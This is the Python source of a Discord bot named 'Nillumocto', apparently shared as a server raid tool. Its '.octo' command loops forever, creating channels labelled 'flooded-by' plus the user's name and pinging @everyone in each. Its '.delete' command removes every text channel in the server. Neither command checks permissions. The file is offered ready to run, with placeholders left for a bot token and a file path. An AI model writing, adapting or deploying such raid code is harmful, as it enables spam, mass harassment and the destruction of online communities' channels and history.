import discord
from discord.ext import commands

client = commands.Bot(command_prefix=".")

@client.command()
async def octo(ctx):
    guild = ctx.guild
    username = ctx.message.author.name
    
    await ctx.send(file=discord.File(r'enter you file path here'))
    while 1 == 1:
        channel = await guild.create_text_channel(f"flooded-by, {username}")

        em = discord.Embed(title = "Nillumocto", description = "\n", color=0x0ff41)
        em.add_field(name="https://github.com/Kamushy/nillumocto", value="Coded by kamushy#0992" )
        await channel.send(embed = em)
        await channel.send("@everyone")

@client.command()
async def delete(ctx):
    await ctx.reply("Channels deleting now, as you wish")
    guild = ctx.guild
    for channel in guild.text_channels:
        await channel.delete()
             
client.run('add your token here')
